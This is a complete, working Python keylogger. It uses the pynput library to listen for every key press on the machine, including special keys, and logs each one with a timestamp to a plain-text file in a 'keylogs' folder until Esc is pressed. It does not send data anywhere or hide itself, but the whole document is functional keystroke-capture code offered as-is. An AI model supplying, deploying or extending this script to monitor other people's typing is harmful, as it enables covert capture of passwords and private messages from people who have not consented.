from pynput.keyboard import Key, Listener
import logging
import os

# Create the log directory if it doesn't exist
log_directory = "keylogs"
log_file = "log.txt"
os.makedirs(log_directory, exist_ok=True)

# Configure logging with full path
log_path = os.path.join(log_directory, log_file)
logging.basicConfig(
    filename=log_path,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        # Handle regular character keys
        if hasattr(key, 'char'):
            logging.info(f"Key pressed: {key.char}")
        # Handle special keys
        else:
            logging.info(f"Special Key pressed: {key}")
    except Exception as e:
        logging.error(f"Error logging key: {str(e)}")
        return False  # Stop listener on error

def on_release(key):
    # Add ability to stop the keylogger with Esc key
    if key == Key.esc:
        return False

# Set up the listener with both press and release handlers
with Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except Exception as e:
        logging.error(f"Listener error: {str(e)}")